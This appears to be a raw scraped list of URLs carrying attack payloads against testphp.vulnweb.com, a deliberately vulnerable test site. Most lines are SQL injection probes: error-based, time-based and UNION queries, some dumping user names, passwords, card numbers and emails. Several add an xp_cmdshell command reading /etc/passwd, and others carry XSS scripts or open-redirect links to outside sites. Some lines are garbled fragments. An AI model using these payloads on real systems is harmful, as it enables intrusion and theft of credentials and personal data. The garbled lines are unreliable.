http://testphp.vulnweb.com/listproducts.php?cat=12.www.vulnsite.com/products/shop.php?id=133.www.icdcprague.org/index.php?id=104.http://www.itsecgames.com/5.http://damnvulnerableiosapp.com/6.http://www.gameofhacks.com/7.http://google-gruyere.appspot.com/8.https://www.hackthis.co.uk/9.https://www.hackthissite.org/10.https://overthewire.org/wargames/11.https://www.root-me.org/?lang=en12.http://www.try2hack.nl/13
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20AND%20GTID_SUBSET%28CONCAT%280x7162787a71%2C%28SELECT%20%28ELT%281769%3D1769%2C1%29%29%29%2C0x716b7a6271%29%2C1769%29--%20GMlJ
http://testphp.vulnweb.com/listproducts.php?cat=12
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%27vlAIso%3C%27%22%3EYETIxV
http://testphp.vulnweb.com/listproducts.php?cat=1%0A%0APour
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20AND%203676%3D2182--%20ENtV
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20AND%202284%3D2697
http://testphp.vulnweb.com/?%3Fid=1%29%20AND%204786%3D%28SELECT%204786%20FROM%20PG_SLEEP%285%29%29%20AND%20%288511%3D8511
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20OR%20UPDATEXML%281889%2CCONCAT%280x2e%2C0x7162787a71%2C%28SELECT%20%28ELT%281889%3D1889%2C1%29%29%29%2C0x716b7a6271%29%2C3280%29--%20tLDQ
http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1,2,3,4,5,6,7,8,9,10,11
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7162787a71%2C%28SELECT%20%28ELT%287847%3D7847%2C1%29%29%29%2C0x716b7a6271%2C0x78%29%29x%29%29--%20LxZf
http://testphp.vulnweb.com/listproducts.php?cat=%3CscRipt%3Enetsparker(0x002752
http://testphp.vulnweb.com/AJAX/infoartist.php?id=3-
http://testphp.vulnweb.com/listproducts.php?artist=123&asdf=ff&cat=123DalFox
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20OR%20GTID_SUBSET%28CONCAT%280x7162787a71%2C%28SELECT%20%28ELT%288030%3D8030%2C1%29%29%29%2C0x716b7a6271%29%2C8030%29--%20zyJS
http://testphp.vulnweb.com/redir.php?r=http://www.joi3.com/go.php?url=https://milkyway.cs.rpi.edu/milkyway/show_user.php?userid=3786558
http://testphp.vulnweb.com/listproducts.php?cat=1+Union+Select+@k:=0x3c2f5469746c652f3c2f5363726970742f27223e3c5376672f4f6e4c6f61643d616c6572742831293e,@k,@k,@k,@k,@k,@k,@k,@k,@k,@k%23
http://testphp.vulnweb.com/?%3Fid=1%20AND%20%28SELECT%204334%20FROM%20%28SELECT%28SLEEP%285%29%29%29BbTj%29
http://testphp.vulnweb.com/?%3Fid=1%27%20AND%201315%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%281315%3D1315%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%27JGRh%27%3D%27JGRh
http://testphp.vulnweb.com:80/listproducts.php?cat=-1+union+select+1,2,3,4,5,6,7,8,9,10,+group_concat(table_name)+from+information_schema.tables+where+table_schema='acuart'+--
http://testphp.vulnweb.com/?%3Fid=1%20AND%201315%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%281315%3D1315%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29
http://testphp.vulnweb.com/?%3Fid=1%20ORDER%20BY%209937--%20tSXW
http://testphp.vulnweb.com/listproducts.php?cat=-1+UNION+SELECT+1%2C2%2C3%2C4%2C5%2C6%2Cuser%28%29%2C8%2C9%2C10%2C11
http://testphp.vulnweb.com/listproducts.php?cat=1%27&gt=
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1
http://testphp.vulnweb.com/listproducts.php?cat=1Upon
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20AND%20GTID_SUBSET%28CONCAT%280x716a767071%2C%28SELECT%20%28ELT%286466%3D6466%2C1%29%29%29%2C0x7178627a71%29%2C6466%29--%20DKgD
http://testphp.vulnweb.com/listproducts.php?cat=12.www.vulnsite.com/products/shop.php?id=133.www.icdcprague.org/index.php?id=104.http://www.itsecgames.com/5.http://damnvulnerableiosapp.com/6.http://www.gameofhacks.com/7.http://google-gruyere.appspot.com/8.https://www.hackthis.co.uk/9.https://www.hackthissite.org/10.https://overthewire.org/wargames/
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-
http://testphp.vulnweb.com/index.php?%25id%25=1%29%20AND%2083%3D83%20AND%20%289286%3D9286&user=2
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29GchC%29%23
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&YVeN=2411%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23
http://testphp.vulnweb.com/?%3Fid=1%27%29%20AND%20EXTRACTVALUE%281877%2CCONCAT%280x5c%2C0x716a717671%2C%28SELECT%20%28ELT%281877%3D1877%2C1%29%29%29%2C0x7178767171%29%29%20AND%20%28%27RTYA%27%3D%27RTYA
http://testphp.vulnweb.com/listproducts.php?cat=1a
http://testphp.vulnweb.com/listproducts.php?cat=%27union+select+%27a%27--
http://testphp.vulnweb.com:80/listproducts.php?cat=1+order+by+11+--
http://testphp.vulnweb.com/listproducts.php?cat=%3CscRipT%3Econfirm%281%29%3C%2Fscript%3E
http://testphp.vulnweb.com/listproducts.php?cat=1%3Cspan
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20AND%20ROW%281538%2C4332%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7162787a71%2C%28SELECT%20%28ELT%281538%3D1538%2C1%29%29%29%2C0x716b7a6271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%208784%20UNION%20SELECT%206642%20UNION%20SELECT%205717%20UNION%20SELECT%206776%29a%20GROUP%20BY%20x%29--%20CcGi
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20AND%20EXTRACTVALUE%287168%2CCONCAT%280x5c%2C0x7178706a71%2C%28SELECT%20%28ELT%287168%3D7168%2C1%29%29%29%2C0x71706b6a71%29%29--%20rHqP
http://testphp.vulnweb.com/listproducts.php?cat=1+order+by+12
http://testphp.vulnweb.com/?%3Fid=1%20AND%201797%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%281797%3D1797%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29--%20evxp
http://testphp.vulnweb.com/listproducts.php?cat=1%0A
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%3BSELECT%20BENCHMARK%285000000%2CMD5%280x48675a4b%29%29--%20wgZo
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCONCAT%280x7178706a71%2C0x6662707068565650784c794c6a6e435050774c656b6d584e5677696e6b47656e705a796851697a56%2C0x71706b6a71%29--%20-
http://testphp.vulnweb.com:80/categories.php/listproducts.php?cat=2
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20OR%20%28SELECT%203374%20FROM%20%28SELECT%28SLEEP%285%29%29%29PKmc%29%23
http://testphp.vulnweb.com/listproducts.php?cat=1''
http://testphp.vulnweb.com/%CB%93%E2%86%92listproducts.php?cat=FUZZ********************************************************
http://testphp.vulnweb.com/?id=1%2F%2A!50000OR%2A%2F1=2
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%27bJmeVo%3C%27%22%3EUdOhxD
http://testphp.vulnweb.com/index.php?%25id%25=1%29%20AND%20%28SELECT%20%25SQLUPPER%20NULL%29%20IS%20NULL%20AND%20%285461%3D5461&user=2
http://testphp.vulnweb.com/AJAX/infoartist.php?id=8732
http://testphp.vulnweb.com/?%3Fid=1%27%29%20ORDER%20BY%201--%20FOGX
http://testphp.vulnweb.com/listproducts.php?cat=1Attack
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20AND%202595%3D4516%23
http://testphp.vulnweb.com/?%3Fid=1%20AND%20EXTRACTVALUE%281877%2CCONCAT%280x5c%2C0x716a717671%2C%28SELECT%20%28ELT%281877%3D1877%2C1%29%29%29%2C0x7178767171%29%29--%20xBAB
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20OR%20%28SELECT%205197%20FROM%20%28SELECT%28SLEEP%285%29%29%29LxuB%29%23
http://testphp.vulnweb.com/redir.php?r=http://gektor.biz/forum/?PAGE_NAME=profile_view&UID=118121
http://testphp.vulnweb.com/AJAX/infoartist.php?id=8878
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283182%2CCONCAT%280x5c%2C0x7176716271%2C%28SELECT%20%28CASE%20WHEN%20%283182%3D3182%29%20THEN%201%20ELSE%200%20END%29%29%2C0x716b786b71%29%29%2C1%29
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL--%20-
http://testphp.vulnweb.com/login.php?id=1%27%29%20AND%205111%3D4026%20AND%20%28%27haFZ%27%3D%27haFZ
http://testphp.vulnweb.com/listproducts.php?cat=1Database
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-
http://testphp.vulnweb.com/redir.php?r=http://sportnabiblioteka.bg/index.php?option=com_k2&view=itemlist&task=user&id=104404
http://testphp.vulnweb.com/listproducts.php?cat=FUZZTotal
http://testphp.vulnweb.com/listproducts.php?cat=1%20OR%20
http://testphp.vulnweb.com/listproducts.php?cat=1^database
http://testphp.vulnweb.com/listproducts.php?cat=4
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20OR%20GTID_SUBSET%28CONCAT%280x7178706a71%2C%28SELECT%20%28ELT%289952%3D9952%2C1%29%29%29%2C0x71706b6a71%29%2C9952%29--%20bkAl
http://testphp.vulnweb.com/listproducts.php?cat=1%20UNION%20SELECT%202;
http://testphp.vulnweb.com/listproducts.php?cat=FUZZ
http://testphp.vulnweb.com/?%3Fid=1%29%20AND%203876%3D7415%20AND%20%284107%3D4107
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20ORDER%20BY%204--%20-
http://testphp.vulnweb.com/listproducts.php?cat=-20%20UNION%20SELECT%2011,%201,%202,%203,%204,%205,%20COLUMN_N
http://testphp.vulnweb.com:80/listproducts.php?cat=-1+union+select+1,2,3,4,5,6,7,8,9,10,+group_concat(column_name)+from+information_schema.columns+where+table_name='users'+--
http://testphp.vulnweb.com/index.php?%25id%25=1&user=2&NuVD=7521%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23
http://testphp.vulnweb.com/listproducts.php?cat=1/nginx/1.4.1176.28.50.165
http://testphp.vulnweb.com:80/comment.php?aid=1
http://testphp.vulnweb.com/?%3Fid=1%20AND%201797%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%281797%3D1797%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%27%29%20AND%206311%3D6311%20AND%20%28%27vgPb%27%3D%27vgPb
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%29%29%29%20AND%202555%3D2931%23
http://testphp.vulnweb.com/redir.php?r=http://e-lena-hatzel-malerei.de/wordpress/?attachment_id=1337/
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20AND%20SLEEP%285%29
http://testphp.vulnweb.com/listproducts.php?cat=FUZZ%27&zfdfasdf=FUZZ
http://testphp.vulnweb.com/listproducts.php?cat=2%20ORDER%20BY%2011
http://testphp.vulnweb.com/listproducts.php?cat=-900990909%20UNION%20SELECT%201,2,3,4,5,6,database(),8,9,10,11;
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20AND%209264%3D9264--%20TATA
http://testphp.vulnweb.com/listproducts.php?cat=-20%20UNION%20SELECT%2011,%201,%202,%203,%204,%205,%20COLUMN_NAME,%207,%208,%209,%2010%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20TABLE_NAME%20=%20N'users'
http://testphp.vulnweb.com/listproducts.php?cat=.1+union+all+select+1,group_concat(uname,0x3a,pass,0x3a,email
http://testphp.vulnweb.com/listproducts.php?cat=12.www.vulnsite.com/products/shop.php?id=133.www.icdcprague.org/index.php?id=104.http://www.itsecgames.com/5.http://damnvulnerableiosapp.com/6.http://www.gameofhacks.com/7.http://google-gruyere.appspot.com/8.https://www.hackthis.co.uk/9.https://www.hackthissite.org/
http://testphp.vulnweb.com:80/listproducts.php?cat=2+order+by+11--+
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283305%2CCONCAT%280x5c%2C%28BENCHMARK%285000000%2CMD5%280x46684b41%29%29%29%29%29%2C1%29--%20HtzW
http://testphp.vulnweb.com/listproducts.php?cat=%2A
http://testphp.vulnweb.com/listproducts.php?cat=2-1
http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1,2,3,4,5,6,7,8,9,10,group_concat(CHARACTER_SET_NAME)+from+information_schema
http://testphp.vulnweb.com/redir.php?r=https://mind.brain.harvard.edu/slot-online11/?id=51589
http://testphp.vulnweb.com/listproducts.php?cat=12.www.vulnsite.com/products/shop.php?id=133.www.icdcprague.org/index.php?id=104.http://www.itsecgames.com/5.http://damnvulnerableiosapp.com/6.http://www.gameofhacks.com/7.http://google-gruyere.appspot.com/
http://testphp.vulnweb.com/listproducts.php?cat=%3CscRipt%3Ealert(0x105C3E
http://testphp.vulnweb.com/listproducts.php?cat=12.www.vulnsite.com/products/shop.php?id=133.www.icdcprague.org/index.php?id=104.http://www.itsecgames.com/5.http://damnvulnerableiosapp.com/6.http://www.gameofhacks.com/7.http://google-gruyere.appspot.com/8.https://www.hackthis.co.uk/9.https://www.hackthissite.org/10
http://testphp.vulnweb.com/?%3Fid=1%20OR%201=1--
http://testphp.vulnweb.com/?%3Fid=1%27%20AND%201=1--%20AND%20IFNULL(1,2)=2--
http://testphp.vulnweb.com/listproducts.php?cat=1%20union%20select%201,2,3,4,5,6,group_concat(uname,%22:%22,pass,%22::%22,cc,%22:::%22,address,%22::::%22,email
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%29%29%20AND%203372%3D8686%23
http://testphp.vulnweb.com/listproducts.php?cat=-20%20UNION%20SELECT%2011,%20uname,%202,%203,%204,%205,%20pass,%20
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%3BSELECT%20BENCHMARK%285000000%2CMD5%280x41764c4a%29%29%23
http://testphp.vulnweb.com/listproducts.php?cat=12.www.vulnsite.com/products/shop.php?id=133.www.icdcprague.org/index.php?id=104.http://www.itsecgames.com/5.http://damnvulnerableiosapp.com/6.http://www.gameofhacks.com/7.http://google-gruyere.appspot.com/8.https://www.hackthis.co.uk/9.https://www.hackthissite.org/10.https://overthewire.org/wargames/11.https://www.root-me.org/?lang=en12.http://www.try2hack.nl/
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20AND%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7162787a71%2C%28SELECT%20%28ELT%286543%3D6543%2C1%29%29%29%2C0x716b7a6271%2C0x78%29%29x%29%29--%20OFtx
http://testphp.vulnweb.com/login.php?id=1%27%29%20AND%20%28SELECT%20NULLIFZERO%28hashcode%28NULL%29%29%29%20IS%20NULL%20AND%20%28%27KPgJ%27%3D%27KPgJ
http://testphp.vulnweb.com/Mod_Rewrite_Shop/details.php?id=4727
http://testphp.vulnweb.com/listproducts.php?cat=3
http://testphp.vulnweb.com/listproducts.php?id=1
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20OR%20%28SELECT%202%2A%28IF%28%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x716a767071%2C%28SELECT%20%28ELT%283357%3D3357%2C1%29%29%29%2C0x7178627a71%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29--%20pTcO
http://testphp.vulnweb.com/listproducts.php?cat=1%20AND%201=1%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11%20from%20information_schema.tables--%20-
http://testphp.vulnweb.com/redir.php?r=https://www.grupopcon.com.br/?option=com_k2&view=itemlist&task=user&id=594916/
http://testphp.vulnweb.com/index.php?%25id%25=1%29%20AND%203780%3D7428%20AND%20%285666%3D5666&user=2
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%3BSELECT%20BENCHMARK%285000000%2CMD5%280x474d6678%29%29
http://testphp.vulnweb.com/?%3Fid=1
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20RLIKE%20%28SELECT%206847%20FROM%20%28SELECT%28SLEEP%285%29%29%29dTCI%29--%20XsdU
http://testphp.vulnweb.com/index.php?%25id%25=1%29%20AND%20%28SELECT%20TDESENCRYPT%28NULL%2CNULL%29%29%20IS%20NULL%20AND%20%283895%3D3895&user=2
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20AND%20ROW%284790%2C6847%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176716271%2C%28SELECT%20%28ELT%284790%3D4790%2C1%29%29%29%2C0x716b786b71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%204316%20UNION%20SELECT%206774%20UNION%20SELECT%207024%20UNION%20SELECT%205627%29a%20GROUP%20BY%20x%29
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x7178706a71%2C0x4541575476586d6e6e58416c786d7578657841536a7844766e696943754c614d73744c535a666271%2C0x71706b6a71%29%2CNULL--%20-
http://testphp.vulnweb.com:80/listproducts.php?cat=2+order+by+1--+
http://testphp.vulnweb.com/?%3Fid=1%20AND%209787%3D8995
http://testphp.vulnweb.com/login.php?id=1%20AND%208999%3D6241
http://testphp.vulnweb.com/?%3Fid=1%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%282947%3D2947
http://testphp.vulnweb.com/listproducts.php?cat=1%20UNION%20SELECT%206;
http://testphp.vulnweb.com/listproducts.php?cat=1Current
http://testphp.vulnweb.com/listproducts.php?cat=12.www.vulnsite.com/products/shop.php?id=133.www.icdcprague.org/index.php?id=104.http://www.itsecgames.com/
http://testphp.vulnweb.com/listproducts.php?cat=1%27%20UNION%20SELECT%201,2,%40%40version--%20-
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7178706a71%2C%28SELECT%20%28ELT%281364%3D1364%2C1%29%29%29%2C0x71706b6a71%29%29%20USING%20utf8%29%29%29--%20oDMv
http://testphp.vulnweb.com/?%3Fid=1%20AND%202017%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2897%29%7C%7CCHR%28111%29%7C%7CCHR%2865%29%7C%7CCHR%2884%29%2C5%29
http://testphp.vulnweb.com/?%3Fid=1%27%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--
http://testphp.vulnweb.com/?%3Fid=1%20AND%20%28SELECT%20halfMD5%28NULL%29%20IS%20NULL%29%20IS%20NULL
http://testphp.vulnweb.com/listproducts.php?cat=1/nginx/1.4.1176.28.50.165Skipped-NR--NR-2http://www.vulnsite.com/products/shop.php?id=13/cloud
http://testphp.vulnweb.com/?%3Fid=1%27%3BSELECT%20PG_SLEEP%285%29--
http://testphp.vulnweb.com/listproducts.php?cat=%27SELECT+%40%40version--
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ZVkT%29--%20FVMS
http://testphp.vulnweb.com/listproducts.php?cat=1%0A%0A%0Avoici
http://testphp.vulnweb.com/?%3Fid=1%27%29%20AND%201797%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%281797%3D1797%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%27XPzM%27%3D%27XPzM
http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1,version%28%29,3,4,5,6,database%28%29,8,9,10,user%28%29
http://testphp.vulnweb.com/listproducts.php?cat=1%20union%20select%201,2,3,4,5,6,group_concat(uname,%22:%22,pass,%22::%22,cc,%22:::%22,address,%22::::%22,email),8,9,10,11%20from%20users
http://testphp.vulnweb.com/?%3Fid=1%29%20AND%201797%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%281797%3D1797%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%281527%3D1527
http://testphp.vulnweb.com/index.php?id=%252%25%27AmlEHB%3C%27%22%3EaUiRnr&user=1
http://testphp.vulnweb.com/redir.php?r=https://numberfields.asu.edu/NumberFields/show_user.php?userid=2610585
http://testphp.vulnweb.com/listproducts.php?cat=%27union+select+null
http://testphp.vulnweb.com/AJAX/infoartist.php?id=3299
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20AND%20%28SELECT%204217%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176716271%2C%28SELECT%20%28ELT%284217%3D4217%2C1%29%29%29%2C0x716b786b71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29
http://testphp.vulnweb.com/listproducts.php?cat=1%2C
http://testphp.vulnweb.com/listproducts.php?cat='
http://testphp.vulnweb.com/%CB%93%E2%86%92listproducts.php?cat=FUZZ*********************************************************
http://testphp.vulnweb.com/listproducts.php?cat=123&zfdfasdf=124fffff
http://testphp.vulnweb.com/?%3Fid=1&uHiF=6004%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23
http://testphp.vulnweb.com/listproducts.php?cat=%27union%20select%20null
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176716271%2C%28SELECT%20%28ELT%289331%3D9331%2C1%29%29%29%2C0x716b786b71%29%29%20USING%20utf8%29%29%29
http://testphp.vulnweb.com/?%3Fid=1%27%20ORDER%20BY%201--%20woPl
http://testphp.vulnweb.com/listproducts.php?cat=.1
http://testphp.vulnweb.com/listproducts.php?cat=1%20UNION%20SELECT%2011;
http://testphp.vulnweb.com:80/listproducts.php=cat=1
http://testphp.vulnweb.com/listproducts.php?cat=-1%E2%80%99%EF%80%A0%EF%80%A0%EF%80%A0%EF%82%B7
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%29%20AND%206311%3D6311%20AND%20%288184%3D8184
http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1,2,3,4,5,6,7,8,9,10,@@version
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%27DebVIU%3C%27%22%3ETEvCSr
http://testphp.vulnweb.com:80/bxss/vuln.php?id=1
http://testphp.vulnweb.com/index.php?%25id%25=1%29%20UNION%20ALL%20SELECT%20NULL%2CNULL--%20APgk&user=2
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-
http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1
http://testphp.vulnweb.com/listproducts.php?cat=1/nginx/1.4.1176.28.50.165Skipped-NR-
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%287428%2CCONCAT%280x5c%2C0x7162787a71%2C%28SELECT%20%28CASE%20WHEN%20%287428%3D7428%29%20THEN%201%20ELSE%200%20END%29%29%2C0x716b7a6271%29%29%2C1%29--%20Offy
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29PdcB%29%23
http://testphp.vulnweb.com/listproducts.php?cat=1%20UNION%20SELECT%201,%202,%203,%204,%205,%206,%20Table_name%20as%20TablesName,%208,%209,%2010,%2011%20FROM%20information_schema.tables
http://testphp.vulnweb.com/listproducts.php?cat=%3CscRipt%253
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-
http://testphp.vulnweb.com/listproducts.php?cat=1+and+97%3E80
http://testphp.vulnweb.com/AJAX/infoartist.php?id=1%20AND%205772%3D5772--%20VKbq
http://testphp.vulnweb.com/?%3Fid=1%27%29%20AND%20%28SELECT%204334%20FROM%20%28SELECT%28SLEEP%285%29%29%29BbTj%29%20AND%20%28%27Hqqe%27%3D%27Hqqe
http://testphp.vulnweb.com/listproducts.php?id=5374
http://testphp.vulnweb.com/listproducts.php?cat=1+and+substring%28%40%40version%2C1%2C1%29%3E4
http://testphp.vulnweb.com/index.php?id=%252%25%27%29%20AND%203362%3D5045%20AND%20%28%27PofB%27%3D%27PofB&user=1
http://testphp.vulnweb.com/?%3Fid=1%27%29%20AND%202017%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2897%29%7C%7CCHR%28111%29%7C%7CCHR%2865%29%7C%7CCHR%2884%29%2C5%29%20AND%20%28%27oZOh%27%3D%27oZOh
